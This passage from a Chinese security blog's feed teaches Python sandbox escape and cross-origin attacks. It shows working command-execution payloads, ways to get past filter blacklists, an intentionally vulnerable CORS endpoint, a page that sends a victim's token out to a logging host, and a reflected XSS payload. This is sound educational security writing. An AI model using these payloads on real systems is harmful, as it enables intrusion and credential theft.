class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">37</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line">object.__subclasses__()[<span class="number">29</span>].__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="思路二实例"><a href="#思路二实例" class="headerlink" title="思路二实例"></a>思路二实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三实例"><a href="#思路三实例" class="headerlink" title="思路三实例"></a>思路三实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路三特例"><a href="#思路三特例" class="headerlink" title="思路三特例"></a>思路三特例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line">object.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="思路四实例"><a href="#思路四实例" class="headerlink" title="思路四实例"></a>思路四实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].append.__class__.__call__(eval, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>有些时候并不是删掉了某个危险模块，而是设置了一个输入关键字黑名单。如果是利用链中的字符串类型可以通过拼接、编码、倒序等多种方式绕过，如果是方法或属性可以通过同义替换绕过。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).sy&quot;</span>+<span class="string">&quot;stem(&#x27;who&quot;</span>+<span class="string">&quot;ami&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">eval(chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">105</span>)+chr(<span class="number">109</span>)+chr(<span class="number">112</span>)+chr(<span class="number">111</span>)+chr(<span class="number">114</span>)+chr(<span class="number">116</span>)+chr(<span class="number">95</span>)+chr(<span class="number">95</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">111</span>)+chr(<span class="number">115</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>)+chr(<span class="number">46</span>)+chr(<span class="number">115</span>)+chr(<span class="number">121</span>)+chr(<span class="number">115</span>)+chr(<span class="number">116</span>)+chr(<span class="number">101</span>)+chr(<span class="number">109</span>)+chr(<span class="number">40</span>)+chr(<span class="number">39</span>)+chr(<span class="number">119</span>)+chr(<span class="number">104</span>)+chr(<span class="number">111</span>)+chr(<span class="number">97</span>)+chr(<span class="number">109</span>)+chr(<span class="number">105</span>)+chr(<span class="number">39</span>)+chr(<span class="number">41</span>))</span><br><span class="line"><span class="comment"># 倒序</span></span><br><span class="line"><span class="string">&quot;)&#x27;imaohw&#x27;(metsys.)&#x27;so&#x27;(__tropmi__&quot;</span>[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="中括号"><a href="#中括号" class="headerlink" title="中括号"></a>中括号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [].__class__.__bases__[0].__subclasses__()[37]</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="点号"><a href="#点号" class="headerlink" title="点号"></a>点号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__bases__&#x27;</span>),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr((),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;bases&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;getitem&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(<span class="number">0</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)(),<span class="string">&#x27;pop&#x27;</span>)(<span class="number">37</span>)</span><br></pre></td></tr></table></figure><h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>只过滤引号的话可以利用一些通过序号取值的方法，但是如果点号不能用就得用getattr，而getattr又需要用到引号。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python 沙箱逃逸</a></p><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">Python沙箱逃逸总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。&lt;/p&gt;
&lt;h2 id=&quot;导入模块&quot;&gt;&lt;a href=&quot;#导入模块&quot; class=&quot;headerlink&quot; title=&quot;导入模块&quot;&gt;&lt;/a&gt;导入模块&lt;/h2&gt;&lt;p&gt;Python导</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="python" scheme="https://hosch3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>同源策略与跨域漏洞</title>
    <link href="https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hosch3n.github.io/2020/08/26/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8E%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-26T08:48:53.000Z</published>
    <updated>2021-08-21T04:17:14.435Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为同源"><a href="#何为同源" class="headerlink" title="何为同源"></a>何为同源</h2><p>如果两个URL的协议、域名、端口一致则满足同源，<code>http</code>与<code>https</code>、<code>a.x.com</code>与<code>b.x.com</code>、<code>:80</code>与<code>:81</code>均不符合同源条件。通过<code>windows.open()</code>等方式打开的<code>about:blank</code>空白页将继承上级的源</p><ul><li>IE浏览器中，两个相互信任的白名单域名之间、以及不同端口均不受同源策略限制</li></ul><h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>在处理前后端分离、跨站请求等业务时可能会涉及跨域访问，浏览器出于安全考虑将拦截跨域请求的响应结果（但不会阻止发出跨域请求），除非存在相应的CORS响应头</p><p>满足CORS条件后，浏览器继续将跨域请求细分为 简单型请求 与 预检型请求。只有满足特定HTTP头的<code>GET</code>、<code>POST</code>、<code>HEAD</code>请求为简单请求，否则为预检请求，具体条件见参考链接2</p><p>简单型请求会直接发起请求并响应结果，但预检型请求发起前浏览器会先发起<code>OPTIONS</code>请求用作校验。预检型请求的响应将包含<code>Access-Control-Max-Age</code>响应头用于说明有效时间（秒），在有效时间内不必再次发起预检请求</p><p>若<code>XMLHttpRequest</code>对象的<code>withCredentials</code>属性被设置为<code>true</code>，或是向<code>fetch()</code>方法的<code>init</code>对象传递了<code>credentials: &#39;include&#39;</code>，则其在发送请求时会附带Cookies。但如果响应头缺少<code>Access-Control-Allow-Credentials: true</code>，则浏览器不会展现响应内容</p><ul><li>带Cookies的请求，服务器的<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，即浏览器不会展现如下响应头组合的页面：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><p>有<code>src</code>属性的标签都是可以发起跨域请求的，但仅限于对其原本内容的引用，而不可以对跨域加载的资源进行读写</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONPadding是一个精妙的民间花式跨域方法，通过回调函数配合JSON数据填充来实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com --&gt;</span><br><span class="line"><span class="comment">// 原生JS形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//b.x.com/?callback=fun&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.getJSON形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.ajax形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>, <span class="comment">// 请求方法JSONP默认GET，POST也会转GET</span></span><br><span class="line">            async: <span class="literal">false</span>, <span class="comment">// 异步请求JSONP默认false，true也会转false</span></span><br><span class="line">            url: <span class="string">&quot;//b.x.com/&quot;</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 传入参数</span></span><br><span class="line">            dataType: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">            jsonp: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">            <span class="comment">// jsonpCallback:&quot;flightHandler&quot;, // 回调函数名jQuery默认随机，也可以写&quot;?&quot;</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.get形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.get(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;<span class="comment">/* ... */</span>&#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- b.x.com --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#x27;</span>.json_encode($data).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="子仗父势"><a href="#子仗父势" class="headerlink" title="子仗父势"></a>子仗父势</h3><p>如果显式地将<code>a.x.com</code>、<code>b.x.com</code>与<code>x.com</code>的<code>document.domain</code>属性同时设置为<code>x.com</code>，则可以同时满足同源条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    - 此赋值会重写端口为NULL </span></span><br><span class="line"><span class="comment">    - 不影响 XMLHttpRequest 与 fetch</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="边缘试探"><a href="#边缘试探" class="headerlink" title="边缘试探"></a>边缘试探</h3><p><code>window.name</code>属性伴随一个window的整个声明周期，在此期间iframe内载入的所有页面共享同一个<code>window.name</code>值</p><p><code>postMesage</code>配合监听事件、<code>location.hash</code>配合中间页均有一定跨域效果</p><h2 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h2><p>若为了方便直接将Origin请求头拼接进CORS响应头，会导致CORS跨域漏洞。假设<code>a.x.com/index.php</code>负责校验身份并设置Cookie，<code>a.x.com/cors.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]) ? $_POST[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]) ? $_POST[<span class="string">&#x27;passwd&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($user===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $passwd===<span class="string">&#x27;passwd&#x27;</span>) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $user;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;logout&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/json.php?callback=jsonp&quot;&gt;用户信息A&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/cors.php&quot;&gt;用户信息B&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/index.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;悲催的A&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-left: 100px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        账户：&lt;input id=&quot;user&quot; type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        密码：&lt;input id=&quot;passwd&quot; type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;登录成功&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/cors.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.$_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;)&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请求失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        fetch(<span class="string">&#x27;//a.x.com/cors.php&#x27;</span>, &#123;</span><br><span class="line">            credentials: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.text();</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">datas</span>) </span>&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;//WebLog/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: JSON.stringify(datas)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p>Chromium从Ver.80开始Cookies的SameSite默认为Lax，即会默认拦截跨域Cookie（感谢phithon师傅的强势指导），Firefox 68.6可以复现</p></li><li><p>可通过<code>Set-Cookie: SameSite=None; Secure</code>响应头显式地允许通过HTTPS传输跨域Cookie</p></li></ul><h2 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h2><p>当JSONP的动态处理页未设置<code>Content-Type</code>响应头时其默认为<code>text/html</code>，可能会导致反射XSS：<code>?callback=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>将JSONP的动态处理页<code>Content-Type</code>响应头设置为<code>application/json</code>便可以防御反射XSS，但仍可能存在JSONP数据劫持</p><p>在讲JSONP数据劫持之前，先了解一下曾出现过的JSON数据劫持。假设<code>json.x.com</code>在校验登录成功后，会向客户端返回<code>account</code>之类的数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;account&quot;</span>: <span 